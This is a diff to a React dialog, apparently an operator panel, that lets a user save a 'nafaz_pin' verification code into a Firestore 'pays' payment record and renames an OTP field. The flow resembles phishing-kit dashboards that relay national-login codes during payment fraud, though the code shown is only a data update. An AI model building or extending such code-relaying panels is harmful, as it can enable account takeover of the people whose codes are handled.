@@ -11,7 +11,7 @@ import {
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Lock, Shield, User } from "lucide-react";
+import { CheckCircle, Lock, Shield, User } from "lucide-react";
 import { doc, updateDoc } from "firebase/firestore";
 import { db } from "@/lib/firebase";
 import { toast } from "sonner";
@@ -34,7 +34,17 @@ export function NafazAuthDialog({
     notification?.autnAttachment || ""
   );
   const [isSubmitting, setIsSubmitting] = useState(false);
-
+  const handleSave = async (id: string, value: string) => {
+    const targetPost = doc(db, "pays", id);
+    await updateDoc(targetPost, {
+      nafaz_pin: value,
+    });
+    toast.success("تم حفظ البيانات بنجاح", {
+      position: "top-center",
+      duration: 3000,
+      icon: <CheckCircle className="h-5 w-5" />,
+    });
+  };
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent
@@ -97,7 +107,7 @@ export function NafazAuthDialog({
 
             <div className="grid gap-2">
               <Label htmlFor="pin" className="text-right">
-                رمز OTP
+                كود التوثيق{" "}
               </Label>
               <div className="relative">
                 <Shield className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
@@ -110,23 +120,12 @@ export function NafazAuthDialog({
                 />
               </div>
             </div>
-
-            <div className="grid gap-2">
-              <Label htmlFor="attachment" className="text-right">
-                مرفق التوثيق
-              </Label>
-              <Input
-                id="attachment"
-                value={attachment}
-                onChange={(e) => setAttachment(e.target.value)}
-                dir="ltr"
-              />
-            </div>
           </div>
         </div>
 
         <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
           <Button
+            onClick={() => handleSave(notification.id, pin)}
             disabled={isSubmitting}
             className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white border-0 shadow-md"
           >
